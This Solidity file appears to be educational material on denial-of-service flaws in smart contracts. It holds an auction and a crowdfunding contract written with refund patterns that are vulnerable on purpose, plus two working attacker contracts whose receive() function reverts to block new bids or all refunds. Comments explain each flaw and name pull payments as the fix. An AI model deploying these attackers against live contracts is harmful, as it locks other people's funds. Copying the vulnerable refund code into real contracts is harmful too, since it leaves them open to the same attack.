// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

/// @title SimpleAuction
contract SimpleAuction {
    /// address of the current leader of the auction
    address public currentLeader;
    /// highest bid so far
    uint256 public highestBid;

    /// Bid on the auction with the value sent together with this transaction.
    /// The old auction leader will receive his ETH back.
    /// To fix use a 'pull payment system'.
    function bid() public payable {
        require(msg.value > highestBid);

        // this below is the point where the auction leader receives his ETH back
        // which triggers the `receive()` method where the attacker can
        // take control of the flow and the DoS attack happens
        (bool sent, ) = currentLeader.call{value: highestBid}('');
        require(sent, 'failed to refund');

        currentLeader = msg.sender;
        highestBid = msg.value;
    }
}

/// @title AuctionDoSAttacker
contract AuctionDoSAttacker {
    /// An interface to the target that will allow us to call its functions.
    SimpleAuction public target;

    /// Set the target on deployment because we need it in storage
    /// to be able to call it from the receive function.
    constructor(address _target) {
        target = SimpleAuction(_target);
    }

    /// Bid on the auction with the value sent together with this transaction.
    /// This contract will be the new auction leader if the transaction is successful.
    function bid() public payable {
        target.bid{value: msg.value}();
    }

    /// This is called when the target contract sends ETH to this contract.
    /// Whenever the auction tries to refund us, we will revert the transaction
    /// and thus prevent any new bids from being made.
    receive() external payable {
        revert('AuctionDoSAttacker: bid denied');
    }
}

/// @title CrowdFunding
contract CrowdFunding {
    /// Addresses of all fund contributors
    address[] public funders;
    /// How much each address has contributed to the fund
    mapping(address => uint256) public funds;
    /// Owner of contract and eventual receiver of crowd funding
    address owner;

    modifier onlyOwner() {
        if (msg.sender != owner) revert('You are not the owner');
        _;
    }

    /// Failed when sending ETH to `to` address.
    error SendingFailed(address to);

    /// Set the owner of the contract on deployment.
    constructor() {
        owner = msg.sender;
    }

    /// Send ETH to crowdfund project.
    function fund() public payable {
        funders.push(msg.sender);
        funds[msg.sender] += msg.value;
    }

    /// Owner can refund all funders.
    function refundAll() public onlyOwner {
        uint256 len = funders.length;
        uint256 i;

        // loop over all funders to refund them
        for (; i < len; ) {
            address to = funders[i];
            uint256 amount = funds[to];

            // a single failure will hold up all funds
            (bool sent, ) = to.call{value: amount}('');
            if (!sent) revert SendingFailed(to);

            unchecked {
                i++;
            }
        }
    }

    /// Calculate and return the total amount of funds raised.
    function totalFunds() public view returns (uint256) {
        uint256 total;
        uint256 len = funders.length;
        uint256 i;

        // loop over all funders to calculate total funds
        for (; i < len; ) {
            total += funds[funders[i]];
            unchecked {
                i++;
            }
        }

        return total;
    }
}

/// @title CrowdFundingDoSAttacker
contract CrowdFundingDoSAttacker {
    /// An interface to the target that will allow us to call its functions.
    CrowdFunding public target;

    /// Set the target on deployment because we need it in storage
    /// to be able to call it from the receive function.
    constructor(address _target) {
        target = CrowdFunding(_target);
    }

    /// Fund the target contract with the value sent together with this transaction.
    function fund() public payable {
        target.fund{value: msg.value}();
    }

    /// This is called when the target contract sends ETH to this contract.
    /// Whenever the crowd funding contract tries to refund all, we will revert the transaction
    /// and thus prevent everyone from being refunded.
    receive() external payable {
        revert('CrowdFundingDoSAttacker: refund denied');
    }
}
